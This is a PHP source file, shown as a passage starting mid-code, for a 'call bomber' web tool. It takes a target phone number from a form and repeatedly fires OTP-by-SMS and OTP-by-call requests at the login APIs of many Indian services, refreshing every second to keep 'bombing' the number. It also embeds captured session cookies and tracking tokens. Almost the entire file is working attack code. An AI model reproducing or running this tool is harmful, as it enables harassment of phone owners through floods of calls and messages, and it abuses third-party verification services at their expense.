    "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform: \"Android\"",
    "origin: https://www.research360.in",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: cors",
    "sec-fetch-dest: empty",
    "referer: https://www.research360.in/login",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,ny;q=0.5",
    "cookie: PHPSESSID=7e4d7a52032733fc803f1efc2cbbcd91",
    "cookie: _gcl_au=1.1.682545795.1688740120",
    "cookie: _fbp=fb.1.1688740120918.621849544",
    "cookie: _ga=GA1.1.1475876091.1688740121",
    "cookie: _ga_0EM04W755S=GS1.1.1688740121.1.0.1688740121.60.0.0",
    "cookie: AWSALB=dJVoqNzMQMPQ+9FEiTxCP0Hr/apawCr+nBjLDaVh77GpaB5mj70jENi62emBDeetdzozWeRNeHrBeZPHl1fSjRJfLNzTDh/JOtYgtHLuP75mM7nRxTiSdoTYDrLu",
    "cookie: AWSALBCORS=dJVoqNzMQMPQ+9FEiTxCP0Hr/apawCr+nBjLDaVh77GpaB5mj70jENi62emBDeetdzozWeRNeHrBeZPHl1fSjRJfLNzTDh/JOtYgtHLuP75mM7nRxTiSdoTYDrLu"
];

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url13);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers13);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and get the response
$response = curl_exec($ch);

// Api 14 //

$url32 = 'https://api.cityflo.com/api/v2/users/auth/otp-via-call/';
$data32 = array(
    'mobile_number' => ''.$number.''
  
);

$jsonData = json_encode($data32);

$headers32 = array(
    'Host:api.cityflo.com',
    'accept-language:en',
    'content-type:application/json; charset=UTF-8',
    'content-length:30',
    'accept-encoding:gzip',
    'user-agent:okhttp/5.0.0-alpha.11',
);

$ch = curl_init($url32);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers32);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); // Enable gzip encoding

$response = curl_exec($ch);
curl_close($ch);
// Function to make cURL requests
function CURL($url, $data, $headers, $method, $timeout) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

    if ($method === 'POST' || $method === 'PUT') {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

    $output = curl_exec($ch);
    $info = curl_getinfo($ch);
    $error = curl_error($ch);

    curl_close($ch);

    return $output;
}

$url78 = 'https://identity.tllms.com/api/request_otp';

$headers78 = array(
    'Content-Type: application/json; charset=UTF-8',
    'User-Agent: 11.7.7.17100/0/0/1/android/13/ /12d13938-60f3-4a3e-ab56-ddadb86913a2',
);

$data78 = array(
    'app_client_id' => 'null',
    'feature' => '',
    'phone' => '+91-' . $number, // Concatenate the string and variable properly
    'type' => 'sms',
);

$options78 = array(
    CURLOPT_URL => $url78,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data78),
    CURLOPT_HTTPHEADER => $headers78,
    CURLOPT_RETURNTRANSFER => true,
);

$curl78 = curl_init();
curl_setopt_array($curl78, $options78);

$response = curl_exec($curl78);

// Check for errors
if (curl_errno($curl)) {
    echo 'cURL Error: ' . curl_error($curl78);
} else {
    // Process the response
    echo $response;
}

curl_close($curl);
// Api 21//
$url199 = 'https://identity.tllms.com/api/request_otp';

$headers199 = array(
    'Content-Type: application/json; charset=UTF-8',
    'User-Agent: 11.7.7.17100/0/0/1/android/13/ /12d13938-60f3-4a3e-ab56-ddadb86913a2',
);

$data199 = array(
    'app_client_id' => 'null',
    'feature' => '',
    'phone' => '+91-' . $number, // Concatenate the string and variable properly
    'type' => 'call',
);

$options199 = array(
    CURLOPT_URL => $url199,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data199), // Use the correct data array
    CURLOPT_HTTPHEADER => $headers199,
    CURLOPT_RETURNTRANSFER => true,
);

$curl199 = curl_init();
curl_setopt_array($curl199, $options199);

$response1 = curl_exec($curl199);

// Check for errors
if (curl_errno($curl1)) {
    echo 'cURL Error: ' . curl_error($curl1);
} else {
    // Process the response
    echo $response1;
}

curl_close($curl1);
$uuid_dash = "5eccecdc-5b6b-9273-4e50-3d21c3a60015"; // Replace with your UUID
$device = "aba34bc1f2672cc6";    // Replace with your device info

// Api 15 //
// Request 3
$url33 = "https://api.doubtnut.com/v4/student/login";
$headers33 = array(
    "Content-Type: application/json; charset=utf-8",
);

$data33 = '{"app_version":"7.10.5","class":"","aaid":"' . $uuid_dash . '","course":"","language":"en","udid":"' . $device . '","gcm_reg_id":"","phone_number":"' . $number . '"}';
$resp33 = CURL($url33, $data33, $headers33, 'POST', 0);
// Api 16 //
// Request 4
$url34 = "https://micro.doubtnut.com/otp/send-call";
$headers34 = array(
    "Content-Type: application/json; charset=utf-8",
);

$data34 = '{"phone":"' . $number . '","locale":"en"}';
$resp34 = CURL($url34, $data34, $headers34, 'PUT', 0);


//Api 17 //

$apiUrl = "https://api.magicbricks.com/bricks/verifyOnCall.html";
$phoneNumber = "callmade";

$queryParams = [
    'identifier' => $phoneNumber,
    'mobile' => $number,
];

$queryString = http_build_query($queryParams);
$fullUrl = $apiUrl . '?' . $queryString;

$response = file_get_contents($fullUrl);

if ($response !== false) {
    $data = json_decode($response, true);
    if ($data !== null) {
        echo "API response: ";
        print_r($data);
    } else {
        echo "Failed to decode JSON response.";
    }
} else {
    echo "Failed to fetch data from the API.";
}

// Execute cURL session and get the response
$response = curl_exec($ch);
$url51 = 'https://api.behica.com/v1/api/auth/customer';

$headers51 = array(
    'User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
    'Content-Type: application/json; charset=utf-8',
    'Accept: */*',
    'Origin: https://www.behica.com',
    'X-Requested-With: pure.lite.browser',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://www.behica.com/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
    // Add other headers as needed
);

$data51 = array(
    'phone' => $number,
);

$ch = curl_init($url51);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data51));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers51);

$response = curl_exec($ch);

//Api 18//
$url58 = "https://api.bookscape.com/ecom/api/user/send-otp";

$data58 = '{"mobile_number":"' . $number . '"}';

$headers58 = array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data58),
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
    'Origin: https://bookscape.com',
    'X-Requested-With: pure.lite.browser',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://bookscape.com/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
);

$ch = curl_init($url58);

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data58);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers58);

$response = curl_exec($ch);

curl_close($ch);
 //Api 19 //
$url59 = 'https://m.parveentravels.com/user/send-otp';

// Data to be sent in the POST request
$number = $_GET['alfabomb'];
$data59 = array(
    'mobileNumber' => $number,
);

// Initialize cURL session
$ch = curl_init($url59);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data59));

// Execute cURL session and get the response
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);
// Api 20//
$url60 = "https://www.bookchor.com/ajax-new.php?functionName=check_user&user=" . $number;

$options60 = [
    CURLOPT_URL => $url60,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => [
        'Host: www.bookchor.com',
        'Content-Length: 0',
        'X-NewRelic-ID: VwcPVFZbDRABUFJVAwkAVVAF',
        'Tracestate: 3185085@nr=0-1-3185085-1437487441-316eb491f73ac1b0----1703066194533',
        'Traceparent: 00-565cf8e75075fb9f9319321aa52e4b20-316eb491f73ac1b0-01',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
        'NewRelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMxODUwODUiLCJhcCI6IjE0Mzc0ODc0NDEiLCJpZCI6IjMxNmViNDkxZjczYWMxYjAiLCJ0ciI6IjU2NWNmOGU3NTA3NWZiOWY5MzE5MzIxYWE1MmU0YjIwIiwidGkiOjE3MDMwNjYxOTQ1MzN9fQ==',
        'Accept: */*',
        'Origin: https://www.bookchor.com',
        'X-Requested-With: pure.lite.browser',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://www.bookchor.com/login',
        'Accept-Encoding: gzip, deflate, br',
        'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
        'Cookie: MAIN_HOST=https%3A%2F%2Fwww.bookchor.com',
        'Cookie: bcsid=132.154.0.192-1703066181',
        'Cookie: bclin=0',
        // Add other headers as needed
    ]
];

$ch = curl_init();
curl_setopt_array($ch, $options60);

$response = curl_exec($ch);
curl_close($ch);


/**************************************/
  $_SESSION["limitset"] +="10";
  echo "<span class='bomb-start'>Bombing Start On This No. : ".$number."</span>";
  echo "<span class='bomb-count'>Call => ".$currentlimit."</span>";
  echo "<a href='callBomb.php' id='stop-btn'>stop</a>";
  echo "<meta http-equiv='refresh' content='1'>";
}
    if(!isset($_GET['submit'])){
    session_unset();
    session_destroy();
    echo'<div class="form">
      <form action="" method="GET">
          <input class="forminput" type="number" name="number" placeholder="Enter Calling No. " />
          <input class="forminput"type="number" name="countnumber" placeholder="Enter No. Of Calls" />
        <input class="btns" type="submit" value="submit" name="submit" />
      </form>
    </div>';
    }
    ?>
    </div>
    <script>
    function stopBomb(){
    }
    </script>
  </body>
</html>